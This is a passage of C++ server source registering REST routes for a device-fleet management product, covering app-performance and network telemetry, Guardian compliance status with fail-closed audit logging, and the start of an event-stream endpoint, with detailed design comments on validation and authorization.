    // last N days" — the F2b retained series dex_perf_model.hpp deferred until the
    // Postgres store landed. GuaranteedState:Read, A4-enveloped. NOT audited:
    // fleet aggregates carry no agent_id (the per-device drill, which does, lands
    // on the audited /dex/devices/{id} family — not here). REST + MCP ship
    // lockstep (the MCP twins are list_dex_perf_apps / get_dex_app_perf). The
    // mean + percentile + hist_version gate is in app_perf_fleet_trend (the ONE
    // shared transform) so REST/MCP/UI cannot disagree.

    auto app_pct_json = [](const std::optional<HistPctile>& p) -> std::string {
        if (!p)
            return "null"; // absent-not-zero: empty population OR a stale-scheme row
        // lower_bound=true → the percentile is in the OPEN top bucket; `value` is a
        // FLOOR (render "≥ value"), never an exact quantile.
        return JObj().add("value", p->value).add("lower_bound", p->lower_bound).str();
    };

    // GET /dex/perf/apps — the picker: apps that currently have retained fleet
    // data, so a worker discovers which `app=` values are answerable (A2).
    sink.Get(
        "/api/v1/dex/perf/apps",
        [perm_fn, app_perf_providers](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "GuaranteedState", "Read"))
                return;
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            if (!app_perf_providers.apps) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "service unavailable", cid, /*retry_after_ms=*/5000,
                                          "retry after server warmup; the app-perf store provider "
                                          "initialises during startup"),
                    "application/json");
                return;
            }
            bool truncated = false;
            auto apps = app_perf_providers.apps(truncated);
            if (!apps) { // AUTHORITATIVE read degrade — surface, never a silent empty
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "app-perf store read degraded", cid,
                                          /*retry_after_ms=*/2000,
                                          "the app-perf store could not be read; retry shortly"),
                    "application/json");
                return;
            }
            JArr arr;
            for (const auto& a : *apps)
                arr.add(JObj()
                            .add("app_name", a.app_name)
                            .add("versions", a.versions)
                            .add("last_day", a.last_day));
            res.set_content(
                ok_json(JObj().raw("apps", arr.str()).add("truncated", truncated).str()),
                "application/json");
        });

    // GET /dex/perf/app?app=<name>&version=<v> — the fleet trend for one app
    // (version omitted = every version, interleaved, each point tagged with its
    // canonicalized version). Exact fleet mean/max + bucket-resolution p50/p95.
    sink.Get("/api/v1/dex/perf/app",
             [perm_fn, app_perf_providers, app_pct_json](const httplib::Request& req,
                                                         httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid);
                 if (!app_perf_providers.fleet) {
                     res.status = 503;
                     res.set_content(detail::error_json_a4(
                                         503, "service unavailable", cid, /*retry_after_ms=*/5000,
                                         "retry after server warmup; the app-perf store provider "
                                         "initialises during startup"),
                                     "application/json");
                     return;
                 }
                 const std::string app = req.has_param("app") ? req.get_param_value("app") : "";
                 if (app.empty()) {
                     res.status = 400;
                     res.set_content(
                         detail::error_json_a4(400, "missing required parameter 'app'", cid,
                                               "supply ?app=<name>; discover names via GET "
                                               "/api/v1/dex/perf/apps"),
                         "application/json");
                     return;
                 }
                 if (!app_perf_param_valid(app)) { // shared cap + control-char/NUL re-floor
                     res.status = 400;
                     res.set_content(
                         detail::error_json_a4(400, "invalid parameter 'app'", cid,
                                               "'app' must be <= 512 bytes with no control "
                                               "characters"),
                         "application/json");
                     return;
                 }
                 const std::string version =
                     req.has_param("version") ? req.get_param_value("version") : "";
                 if (!app_perf_param_valid(version)) { // "" allowed = all-versions sentinel
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "invalid parameter 'version'", cid),
                                     "application/json");
                     return;
                 }
                 auto rows = app_perf_providers.fleet(app, version);
                 if (!rows) { // AUTHORITATIVE read degrade
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "app-perf store read degraded", cid,
                                               /*retry_after_ms=*/2000,
                                               "the app-perf store could not be read; retry shortly"),
                         "application/json");
                     return;
                 }
                 JArr points;
                 for (const auto& pt : app_perf_fleet_trend(*rows)) {
                     // The fleet path floors too now, so a sub-floor point carries
                     // suppressed=true with device_count only — same shape as the
                     // group endpoint; without the flag a suppressed point would read
                     // as "N devices @ 0% CPU" (security re-review).
                     JObj o;
                     o.add("version", pt.version)
                         .add("day", pt.day)
                         .add("device_count", pt.device_count)
                         .add("suppressed", pt.suppressed);
                     if (!pt.suppressed)
                         o.add("cpu_mean", pt.cpu_mean)
                             .add("cpu_max", pt.cpu_max)
                             .raw("cpu_p50", app_pct_json(pt.cpu_p50))
                             .raw("cpu_p95", app_pct_json(pt.cpu_p95))
                             .add("ws_mean", pt.ws_mean)
                             .add("ws_max", pt.ws_max)
                             .raw("ws_p50", app_pct_json(pt.ws_p50))
                             .raw("ws_p95", app_pct_json(pt.ws_p95))
                             .add("hist_stale", pt.hist_stale);
                     points.add(std::move(o));
                 }
                 res.set_content(ok_json(JObj()
                                             .add("app", app)
                                             .add("version", version)
                                             .raw("points", points.str())
                                             .str()),
                                 "application/json");
             });

    // GET /dex/perf/group?group_id=<id>&app=<name>&version=<v> — the management-
    // group trend: the same fleet-trend shape, aggregated on-the-fly over ONE
    // group's members (B1, NOT the fleet B2), with the statistical-floor
    // suppression a NAMED group needs (a small group of specific devices ⇒
    // de-facto individual behaviour). Aggregate → GuaranteedState:Read, NOT
    // audited (cohort posture). Sub-floor points carry suppressed=true with
    // device_count only.
    //
    // Authz: gated on the GLOBAL perm_fn (check_permission), exactly like the
    // cohort surface — NOT scoped_perm_fn. check_permission reads only global role
    // grants; management-group-scoped grants live in a separate table consulted
    // only by check_scoped_permission. So a scoped-only principal returns false
    // here and never reaches this endpoint; the only callers who pass already hold
    // unscoped fleet-wide Read and can compute every cohort/fleet aggregate AND
    // pull any single device anyway. The group roll-up is a strict subset of that
    // — no cross-operator exposure. Scoped operators are excluded by design (the
    // cohort posture), not by an unfinished control.
    sink.Get(
        "/api/v1/dex/perf/group",
        [perm_fn, app_perf_providers, app_pct_json](const httplib::Request& req,
                                                    httplib::Response& res) {
            if (!perm_fn(req, res, "GuaranteedState", "Read"))
                return;
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            if (!app_perf_providers.group) {
                res.status = 503;
                res.set_content(detail::error_json_a4(
                                    503, "service unavailable", cid, /*retry_after_ms=*/5000,
                                    "retry after server warmup; the app-perf store provider "
                                    "initialises during startup"),
                                "application/json");
                return;
            }
            const std::string group_id =
                req.has_param("group_id") ? req.get_param_value("group_id") : "";
            if (group_id.empty()) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "missing required parameter 'group_id'", cid,
                                          "supply ?group_id=<management group id>"),
                    "application/json");
                return;
            }
            if (!app_perf_param_valid(group_id)) { // shared cap + control-char/NUL re-floor
                res.status = 400;
                res.set_content(detail::error_json_a4(400, "invalid parameter 'group_id'", cid),
                                "application/json");
                return;
            }
            const std::string app = req.has_param("app") ? req.get_param_value("app") : "";
            if (app.empty()) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "missing required parameter 'app'", cid,
                                          "supply ?app=<name>; discover names via GET "
                                          "/api/v1/dex/perf/apps"),
                    "application/json");
                return;
            }
            if (!app_perf_param_valid(app)) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "invalid parameter 'app'", cid,
                                          "'app' must be <= 512 bytes with no control characters"),
                    "application/json");
                return;
            }
            const std::string version =
                req.has_param("version") ? req.get_param_value("version") : "";
            if (!app_perf_param_valid(version)) { // "" allowed = all-versions sentinel
                res.status = 400;
                res.set_content(detail::error_json_a4(400, "invalid parameter 'version'", cid),
                                "application/json");
                return;
            }
            auto rows = app_perf_providers.group(group_id, app, version);
            if (!rows) { // AUTHORITATIVE degrade (member resolution OR aggregate read)
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "app-perf group read degraded", cid,
                                          /*retry_after_ms=*/2000,
                                          "the app-perf store could not be read; retry shortly"),
                    "application/json");
                return;
            }
            JArr points;
            for (const auto& pt : app_perf_group_trend(*rows, kDexCohortFloor)) {
                JObj o;
                o.add("version", pt.version)
                    .add("day", pt.day)
                    .add("device_count", pt.device_count)
                    .add("suppressed", pt.suppressed);
                if (!pt.suppressed) {
                    o.add("cpu_mean", pt.cpu_mean)
                        .add("cpu_max", pt.cpu_max)
                        .raw("cpu_p50", app_pct_json(pt.cpu_p50))
                        .raw("cpu_p95", app_pct_json(pt.cpu_p95))
                        .add("ws_mean", pt.ws_mean)
                        .add("ws_max", pt.ws_max)
                        .raw("ws_p50", app_pct_json(pt.ws_p50))
                        .raw("ws_p95", app_pct_json(pt.ws_p95))
                        .add("hist_stale", pt.hist_stale);
                }
                points.add(std::move(o));
            }
            res.set_content(ok_json(JObj()
                                        .add("group_id", group_id)
                                        .add("app", app)
                                        .add("version", version)
                                        .add("floor", static_cast<int64_t>(kDexCohortFloor))
                                        .raw("points", points.str())
                                        .str()),
                            "application/json");
        });

    // ── N1: network quality read model (/api/v1/network/*) ───────────────────
    //
    // Machine-readable A1 parity with the /network fragments — "is the fleet's
    // link health OK?" must be answerable without scraping HTML. Same
    // render-time aggregation over registry heartbeat NETWORK facts the
    // fragments use (one NetPerfFn provider, two surfaces), same
    // GuaranteedState:Read gate. NOT audited: device-aggregate link health
    // (RTT/retransmit/throughput — device state, not behavioral data), mirroring
    // the DEX-perf rationale. Cohort handling mirrors the /network FRAGMENT
    // (empty-string default = no cohort, light length guard), NOT the DEX REST's
    // "model" default / validate_key — so the machine sibling matches the
    // fragment it mirrors exactly.

    auto net_stat_json = [](const std::optional<NetPerfStat>& s) -> std::string {
        if (!s)
            return "null"; // absent-not-zero: nobody reported this metric
        return JObj()
            .add("avg", s->avg)
            .add("p50", s->p50)
            .add("p90", s->p90)
            .add("max", s->max)
            .add("n", s->n)
            .str();
    };

    // GET /network/fleet — fleet-now RTT / retransmit / throughput stats + the
    // honest denominators + the measured co-occurrence counts. OS-blended over the
    // same per-device facts the per-OS yuzu_fleet_net_* gauges carry (a gauge
    // series, split by os, differs from this blended number on a mixed fleet).
    sink.Get("/api/v1/network/fleet",
             [perm_fn, net_perf_fn, net_stat_json](const httplib::Request& req,
                                                   httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 if (!net_perf_fn) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 const auto now = net_perf_fleet_now(net_perf_fn(std::string{}));
                 res.set_content(
                     ok_json(JObj()
                                 .raw("rtt_ms", net_stat_json(now.rtt))
                                 .raw("retrans_pct", net_stat_json(now.retrans))
                                 .raw("throughput_bps", net_stat_json(now.throughput))
                                 .add("reporting", now.reporting)
                                 .add("rtt_reporting", now.rtt_reporting)
                                 .add("online", now.online)
                                 .raw("cooccurrence",
                                      JObj()
                                          .add("degraded", now.cooc.degraded)
                                          .add("also_device", now.cooc.also_device)
                                          .add("also_app", now.cooc.also_app)
                                          .add("network_only", now.cooc.network_only)
                                          .str())
                                 .str()),
                     "application/json");
             });

    // GET /network/devices?metric=&filter=&cooc=&key=&cohort_value=&limit= — the
    // ONE device list behind every /network drill: worst-by-metric (default
    // rtt), the not-reporting complement (filter=not_reporting), a co-occurrence
    // band (cooc=device|app|network_only|degraded), or a cohort's members. Rows
    // carry the co-occurring FACTS (under_pressure/app_unstable) and the fleet
    // percentile — evidence shown for correlation, never a verdict.
    sink.Get("/api/v1/network/devices",
             [perm_fn, net_perf_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 if (!net_perf_fn) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 const NetPerfMetric metric = net_perf_metric_from_token(
                     req.has_param("metric") ? req.get_param_value("metric") : "rtt");
                 const bool not_reporting = req.has_param("filter") &&
                                            req.get_param_value("filter") == "not_reporting";
                 const NetCoocFilter cooc =
                     req.has_param("cooc") ? net_cooc_from_token(req.get_param_value("cooc"))
                                           : NetCoocFilter::kNone;
                 // Cohort handling mirrors the FRAGMENT: `key` param, empty
                 // default (no cohort resolution), light length guard — NOT the
                 // DEX REST's "model" default / validate_key (which would 400 on
                 // the empty default the fragment uses).
                 std::string cohort_key = req.has_param("key") ? req.get_param_value("key") : "";
                 if (cohort_key.size() > 64)
                     cohort_key.clear();
                 std::optional<std::string> cohort_filter;
                 if (req.has_param("cohort_value"))
                     cohort_filter = req.get_param_value("cohort_value");
                 int limit = 50;
                 if (req.has_param("limit")) {
                     int v = 0;
                     auto s = req.get_param_value("limit");
                     [[maybe_unused]] auto [_, ec] =
                         std::from_chars(s.data(), s.data() + s.size(), v);
                     if (ec != std::errc{} || v <= 0) {
                         res.status = 400;
                         res.set_content(error_json("invalid limit"), "application/json");
                         return;
                     }
                     limit = std::min(v, 500);
                 }
                 const auto rows = net_perf_device_list(net_perf_fn(cohort_key), metric,
                                                        not_reporting, cooc, cohort_filter, limit);
                 JArr arr;
                 for (const auto& r : rows) {
                     JObj o;
                     o.add("agent_id", r.agent_id).add("platform", r.platform).add("cohort", r.cohort);
                     if (r.rtt_ms)
                         o.add("rtt_ms", *r.rtt_ms);
                     if (r.retrans_pct)
                         o.add("retrans_pct", *r.retrans_pct);
                     if (r.throughput_bps)
                         o.add("throughput_bps", *r.throughput_bps);
                     o.add("net_degraded", r.net_degraded)
                         .add("under_pressure", r.under_pressure)
                         .add("app_unstable", r.app_unstable);
                     if (r.fleet_pctile >= 0)
                         o.add("fleet_pctile", static_cast<int64_t>(r.fleet_pctile));
                     arr.add(std::move(o));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(rows.size()), 0),
                                 "application/json");
             });

    // GET /status, /status/:agent_id, /alerts — placeholders that respond
    // with empty rollups for PR 2. Real fleet aggregation arrives in PR 4
    // (status) and PR 11 (alerts). Returning empty structures now keeps
    // dashboard fragments and audit tooling exercisable against the API.
    // Field names match the agent-side proto `GuaranteedStateStatus`
    // (compliant_rules / drifted_rules / errored_rules) so REST and proto
    // schemas do not diverge when PR 4 wires real aggregation.
    sink.Get(
        "/api/v1/guaranteed-state/status",
        [perm_fn, guaranteed_state_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "GuaranteedState", "Read"))
                return;
            const auto rules = guaranteed_state_store ? guaranteed_state_store->rule_count() : 0;
            res.set_content(ok_json(JObj()
                                        .add("total_rules", static_cast<int64_t>(rules))
                                        .add("compliant_rules", 0)
                                        .add("drifted_rules", 0)
                                        .add("errored_rules", 0)
                                        .add("note", "fleet aggregation lands in Guardian PR 4")
                                        .str()),
                            "application/json");
        });

    sink.Get(R"(/api/v1/guaranteed-state/status/([A-Za-z0-9._\-]+))",
             [perm_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 auto agent_id = req.matches[1].str();
                 res.set_content(ok_json(JObj()
                                             .add("agent_id", agent_id)
                                             .add("total_rules", 0)
                                             .add("compliant_rules", 0)
                                             .add("drifted_rules", 0)
                                             .add("errored_rules", 0)
                                             .add("note", "per-agent status lands in Guardian PR 4")
                                             .str()),
                                 "application/json");
             });

    // ── Name-anchored, device-applicable Guardian compliance (ServiceNow CI) ──
    //
    // GET /api/v1/guaranteed-state/device-compliance?baseline={name}&agent_id={id}
    //
    // Machine-readable A1 sibling of the dashboard baseline page: for the Baseline
    // identified by NAME + ONE device, return the Guards ACTUALLY APPLICABLE to that
    // device, each with the device's last reported (Observe-mode) verdict.
    //
    // Keyed by NAME, not baseline_id: an integration (ServiceNow) pins one stable
    // constant ("ServiceNow Compliance") that survives reseeds — never a churning id.
    //
    // Device-applicable subset (report-driven): the Baseline's members are a SUPERSET
    // of all relevant Guards, each carrying its own scope_expr; the push fan-out
    // (agent_in_scope) arms a DIFFERENT subset per machine. So the denominator here is
    // the intersection of the deployed_snapshot with the Guards this device has
    // reported — an out-of-scope Guard (never armed → never reported) is absent, and
    // each machine shows only its applicable Guards from the one shared Baseline.
    // A not-deployed Baseline returns deployed:false + empty guards (consumer renders
    // "No Baseline Deployed"). updated_at carries staleness.
    //
    // Tradeoff (deferred upgrade): report-driven can't tell "out of scope" from
    // "in-scope but offline/slow" (both absent). The honest version evaluates each
    // member's scope_expr against the device (scope engine + device tags/OS) so an
    // in-scope-unreported Guard shows "pending"; deferred — registry/service guards
    // emit compliant-on-arm quickly and the consumer tracks device online/offline.
    //
    // Per-device behavioral read → per-device-SCOPED GuaranteedState:Read (management-
    // group aware, mirroring the dashboard Guardian device lens, so a group-scoped
    // operator isn't fail-closed out of in-scope devices) + guardian.device.view audit.
    sink.Get(
        "/api/v1/guaranteed-state/device-compliance",
        [scoped_perm_fn, audit_fn, guaranteed_state_store,
         baseline_store](const httplib::Request& req, httplib::Response& res) {
            // One correlation id for the whole request, surfaced as X-Correlation-Id
            // on EVERY path (success + all error branches) — parity with the
            // dex.device.view / dex.signals / events siblings (#1651, cons-1). Every
            // error body reuses this same cid so the header and the A4 body can't
            // diverge.
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            const std::string baseline_name = req.get_param_value("baseline");
            const std::string agent_id = req.get_param_value("agent_id");
            // Both query params are required. Bound their length to the canonical
            // enrolled-agent-id limit (auth::kMaxAgentIdLength, 256 — the ceiling
            // enrollment enforces) so an over-long value is rejected by THIS route
            // before it reaches the store. A4 400 on missing or over-length.
            if (baseline_name.empty() || agent_id.empty()) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(
                        400, "baseline and agent_id query parameters required", cid),
                    "application/json");
                return;
            }
            if (baseline_name.size() > auth::kMaxAgentIdLength ||
                agent_id.size() > auth::kMaxAgentIdLength) {
                res.status = 400;
                res.set_content(detail::error_json_a4(400, "query parameter too long", cid),
                                "application/json");
                return;
            }
            // Reject control characters (bytes < 0x20: NUL, TAB, CR, LF, …) in both
            // params. The replaced path route's regex ([A-Za-z0-9._-]+) excluded
            // these; the query-param route accepts arbitrary bytes, so re-floor it.
            // Closes two charset-removal hazards: (1) an embedded NUL truncates the
            // SQL bind (sqlite3_bind_text(...,-1,...) stops at NUL) while the audit
            // detail records the full string — diverging queried-name from
            // audited-name; (2) a CR/LF forges lines in the guardian.device.view
            // audit detail. Printable names pass — spaces ("ServiceNow Compliance")
            // and UTF-8 continuation bytes (≥0x80) are not < 0x20.
            const auto has_control_char = [](const std::string& s) {
                for (unsigned char c : s)
                    if (c < 0x20)
                        return true;
                return false;
            };
            if (has_control_char(baseline_name) || has_control_char(agent_id)) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(
                        400, "query parameter contains control characters", cid),
                    "application/json");
                return;
            }
            // Per-device VISIBILITY scope (management-group aware), matching the
            // dashboard Guardian device lens (device_routes.cpp): a global
            // GuaranteedState:Read passes fleet-wide, otherwise the principal must hold
            // Read via a management group the agent is in — so a group-scoped operator
            // (or integration service account) is not fail-closed out of the devices
            // they can legitimately see. agent_id must be in hand before the gate,
            // hence the reorder above. The scoped fn is a REQUIRED dependency for this
            // route: if a call site fails to wire it, fail loud (503) rather than
            // silently fall back to the flat global gate that re-introduces the
            // group-scoped lockout this route exists to fix. Production wires it in
            // server.cpp; the in-process test harness wires its own.
            if (!scoped_perm_fn) {
                // Distinct message from the store-null 503 below so log triage
                // identifies the defect (unwired call site) without reading source.
                spdlog::error("guardian.device.baseline: scoped_perm_fn unwired — "
                              "misconfigured call site; failing closed; cid={}",
                              cid);
                res.status = 503;
                res.set_content(detail::error_json_a4(503, "service unavailable", cid),
                                "application/json");
                return;
            }
            if (!scoped_perm_fn(req, res, "GuaranteedState", "Read", agent_id))
                return;
            if (!guaranteed_state_store || !baseline_store) {
                spdlog::error("guardian.device.baseline: store null "
                              "(guaranteed_state_store/baseline_store) — "
                              "registration-order defect; cid={}",
                              cid);
                res.status = 503;
                res.set_content(detail::error_json_a4(503, "service unavailable", cid),
                                "application/json");
                return;
            }
            bool baseline_store_ok = true;
            const auto baseline =
                baseline_store->get_baseline_by_name(baseline_name, &baseline_store_ok);
            if (!baseline_store_ok) {
                // Store FAULT (DB locked/corrupt), NOT a genuine miss — return a
                // retryable 503, not the 404 a CMDB would read as "no such baseline →
                // delete this CI" on a transient fault (UP-13/sre-2). Pre-audit, like
                // the store-null/unwired 503s above: no PII was looked up, and a
                // name-independent fault leaks no baseline existence (no enumeration).
                res.status = 503;
                res.set_content(detail::error_json_a4(503, "baseline store unavailable", cid, 5000,
                                                      "retry the request"),
                                "application/json");
                spdlog::warn("guardian.device.view baseline store fault (503) cid={} agent_id={}",
                             cid, agent_id);
                return;
            }

            // Behavioral-PII access audit — FAIL-CLOSED via the shared #1647 kernel
            // detail::emit_behavioral_audit (parity with GET /dex/devices/{id}, GET
            // /guaranteed-state/events?agent_id=, and the dashboard Guardian device
            // lens; ONE helper so the persist-bool contract / Sec-Audit-Failed header /
            // catch-arm log can never drift between surfaces again — the drift #1647
            // closed). Serving audited per-device compliance while the
            // guardian.device.view row is known-lost is exactly what audit-on-open
            // exists to prevent (SOC 2 CC7.2 / works-council).
            //
            // `result` keeps the found/not_found distinction (enumeration trail, same
            // verb the dashboard lens and the /events sibling emit). A persist failure
            // (or a thrown audit_fn — caught inside the helper, never a bare 500)
            // returns 503 BEFORE the 404 below, so an audit outage never reveals
            // baseline existence without durable evidence (anti-enumeration —
            // deliberate). emit_behavioral_audit sets Sec-Audit-Failed on failure; a
            // null audit_fn (audit-off / test) returns true and serves, per the AuditFn
            // contract. The pre-auth rejections above (400, 503 unwired/store-null)
            // carry no authorized access and are intentionally not audited here.
            if (!detail::emit_behavioral_audit(
                    audit_fn, req, res, "guardian.device.view", baseline ? "success" : "not_found",
                    "Agent", agent_id,
                    "baseline '" + baseline_name + "' per-device guard status via REST")) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "audit subsystem unavailable; refusing to serve "
                                               "device data without durable evidence",
                                          cid, 5000, "retry the request"),
                    "application/json");
                spdlog::warn("guardian.device.view audit fail-closed (503) cid={} agent_id={}", cid,
                             agent_id);
                return;
            }

            if (!baseline) {
                res.status = 404;
                res.set_content(detail::error_json_a4(404, "baseline not found", cid),
                                "application/json");
                return;
            }

            const bool deployed = (baseline->lifecycle == kBaselineDeployed);
            const auto guard_ids = baseline_store->deployed_member_rule_ids(baseline->baseline_id);

            // rule_id -> Guard name, resolved ONLY for this baseline's deployed
            // members (name-only read; never materializes the rule body blobs).
            // Bounded WHERE rule_id IN (guard_ids) rather than the full authored
            // catalogue — this is per-request on the fleet-polled device-compliance
            // path. Falls back to the rule_id when a snapshot member Guard has since
            // been deleted (absent from the map).
            const auto rule_names = guaranteed_state_store->rule_names_for(guard_ids);

            // rule_id -> last reported verdict for THIS device.
            std::unordered_map<std::string, GuardianAgentRuleStatus> dev;
            for (auto& st : guaranteed_state_store->agent_rule_statuses_for_agent(agent_id))
                dev[st.rule_id] = std::move(st);

            int64_t compliant = 0, drifted = 0, errored = 0;
            // max reported updated_at; ISO-8601 sorts lexically (all stamps are UTC
            // 'Z', written by the store's format_iso_utc, so the byte compare is correct).
            std::string last_updated;
            // Report-driven device-applicable subset: emit ONLY the deployed-snapshot
            // members this device has actually reported a verdict for. A member that
            // is out of scope for this device (its scope_expr excludes it → the push
            // never armed it → it never reported) is correctly ABSENT, so each machine
            // shows only its applicable Guards even though they share one Baseline.
            // (Honest in-scope-but-unreported "pending" needs scope-engine evaluation
            // per device — deferred; see the route header.) guard_ids is the snapshot
            // order, so the emitted subset keeps a stable order.
            JArr guards;
            int64_t total_guards = 0;
            for (const auto& rid : guard_ids) {
                const auto it = dev.find(rid);
                if (it == dev.end())
                    continue;  // not applicable to this device
                ++total_guards;
                std::string status = "pending";
                const std::string& s = it->second.state;
                if (s == "compliant") { status = s; ++compliant; }
                else if (s == "drifted") { status = s; ++drifted; }
                else if (s == "errored") { status = s; ++errored; }
                // any unexpected stored state falls through to "pending" — the
                // forward-compat path: a future verdict token this build doesn't
                // recognize stays counted in total_guards as pending, never silently
                // dropped from the denominator.
                //
                // The report row EXISTS here (we are past dev.find != end), so it
                // carries a real timestamp regardless of whether the token is
                // recognized. Capture updated_at for staleness INDEPENDENT of the
                // status LABEL (hp-1): an unrecognized-token "pending" guard (e.g. a
                // newer agent talking to an older server) DID report recently —
                // suppressing its updated_at would conflate "reported, unknown token"
                // with "never reported", and a consumer watching last_updated could
                // not tell them apart.
                const std::string& updated_at = it->second.updated_at;
                if (!updated_at.empty() && updated_at > last_updated)
                    last_updated = updated_at;
                const auto nit = rule_names.find(rid);
                JObj g;
                g.add("rule_id", rid)
                    .add("name",
                         (nit != rule_names.end() && !nit->second.empty()) ? nit->second : rid)
                    .add("status", status);
                if (updated_at.empty())
                    g.raw("updated_at", "null");
                else
                    g.add("updated_at", updated_at);
                guards.add(std::move(g));
            }

            const int64_t pending = total_guards - (compliant + drifted + errored);

            JObj b;
            b.add("baseline_id", baseline->baseline_id)
                .add("name", baseline->name)
                .add("lifecycle", baseline->lifecycle);

            // assessable: a machine-readable go/no-go for a CMDB consumer (UP-2 /
            // comp-1 / er-1). FALSE when the response carries no compliance signal to
            // act on — a draft Baseline, or a deployed Baseline for which this device
            // has reported NO applicable Guard (newly-enrolled / offline / every Guard
            // out of scope). When false the consumer MUST NOT compute or render a
            // compliance percentage. snapshot_total is the Baseline's full deployed
            // member count (the SUPERSET across all devices, NOT this device's in-scope
            // count): total_guards < snapshot_total is EXPECTED for a per-machine-scoped
            // Baseline, but a large gap is a cue that coverage may be partial — the
            // honest per-device in-scope denominator needs the deferred scope_expr
            // evaluation (see route header). Until then, do NOT gate remediation on
            // compliant/total_guards.
            JObj data;
            data.raw("baseline", b.str())
                .add("deployed", deployed)
                .add("assessable", deployed && total_guards > 0)
                .add("agent_id", agent_id)
                .add("total_guards", total_guards)
                .add("snapshot_total", static_cast<int64_t>(guard_ids.size()))
                .add("compliant", compliant)
                .add("drifted", drifted)
                .add("errored", errored)
                .add("pending", pending);
            if (last_updated.empty())
                data.raw("last_updated", "null");
            else
                data.add("last_updated", last_updated);
            data.raw("guards", guards.str());

            res.set_content(ok_json(data.str()), "application/json");
        });

    sink.Get("/api/v1/guaranteed-state/alerts",
             [perm_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 res.set_content(list_json("[]", 0), "application/json");
             });

    // ── W5.1 — GET /api/v1/events (agentic JSON SSE) ─────────────────────
    //
    // First surface that satisfies agentic-first invariant A3
    // (`docs/agentic-first-principle.md`): every long-running operation
    // emits Server-Sent Events on a documented, authenticated,
    // agent-accessible channel with JSON envelopes.
    //
    // Skeleton scope (sprint W5.1):
    //   * Required `?execution_id=<id>` filter — multi-execution /
    //     `?filter=...` syntax is W5.2.
    //   * Reuses `ExecutionEventBus` (per ladder doc — no new bus).
    //   * Replays via `Last-Event-ID` header OR `?since=<id>` query
    //     param (query wins). Bad input degrades to 0 (no replay)
    //     rather than 400, matching the dashboard sibling.
    //   * Per-connection queue cap (`kPerConnectionQueueCapDefault`)
    //     with drop-oldest — a slow / blackholed consumer cannot grow
    //     the queue without bound. Drops are surfaced to the client
    //     via a synthetic `events-dropped` envelope on the next
    //     provider invocation, and counted in
    //     `yuzu_server_sse_api_queue_overflow_total{route="events"}`.
    //   * Replay-gap detection: if the bus's ring buffer has already
    //     evicted events with id ≤ since_id, emit a synthetic
    //     `replay-gap` envelope as the first frame so the agentic
    //     worker knows state may be inconsistent rather than silently
    //     receiving a partial history.
    //   * A4 envelope on all 4xx/5xx: `{error:{code,message,
    //     correlation_id,[retry_after_ms],[remediation]},
    //     meta:{api_version:"v1"}}`. 503 sites carry retry_after_ms.
    //   * Audit `api.v1.events.subscribe` on each successful connect
    //     (no per-session dedup — same Deferred-5 / #700 deferral as
    //     the dashboard's `/sse/executions/{id}`).
    //   * Post-auth denial branches (404/410/503) emit a
    //     `spdlog::warn` row with the correlation id and the
    //     authenticated principal so operators can reconstruct what
    //     happened without the client surfacing the cid (compliance
    //     F-2 / `docs/observability-conventions.md`).
    //   * Endpoint-scoped Prometheus metrics:
    //     `yuzu_server_sse_api_subscriptions_total` (counter),
    //     `yuzu_server_sse_api_active` (gauge),
    //     `yuzu_server_sse_api_queue_overflow_total` (counter),
    //     `yuzu_server_sse_api_replay_gap_total` (counter).
    //
    // **Known race window (governance unhappy-R10 + tracked as a
    // follow-up issue against `ExecutionEventBus`):** `replay_since`
    // and `subscribe` run under separate locks. A publish that fires
    // between the two is neither replayed (it post-dates the buffer
    // snapshot) nor delivered live (the listener is not yet
    // installed). The fix is bus-side — an atomic
    // `subscribe_with_replay` API that holds the channel mutex across
    // both — and benefits the dashboard sibling identically, so it is
    // filed as a single follow-up rather than fixed inline.
    //
    // Parity with the dashboard sibling at `workflow_routes.cpp` —
    // both consume the same per-execution channel from
    // `ExecutionEventBus` and apply identical preflight ordering
    // (auth → perm → tracker → bus → execution → terminal → audit →
    // headers → replay → subscribe → chunked provider). The wire
    // shapes differ on purpose: this surface emits the A3-mandated
    // JSON envelope with `execution_id` baked into every event so an
    // agentic worker subscribed to one channel can still discriminate
    // events; the dashboard sibling emits raw `ev.data` because the
    // browser already knows the channel from the URL path.
    sink.Get("/api/v1/events", [auth_fn, perm_fn, audit_fn, execution_tracker, execution_event_bus,
                                metrics_registry](const httplib::Request& req,
                                                  httplib::Response& res) {
        auto session = auth_fn(req, res);
        if (!session) {
            // auth_fn already set 401 + body. Nothing to do.
            return;
        }
        if (!perm_fn(req, res, "Execution", "Read")) {
            // perm_fn already set 403 + body.
            return;
        }

        // A4 correlation id binds every error / audit row / spdlog
        // line on this request to a single grep token. Generated
        // once up-front so 4xx branches and the audit row share it.
        const auto cid = detail::make_correlation_id();

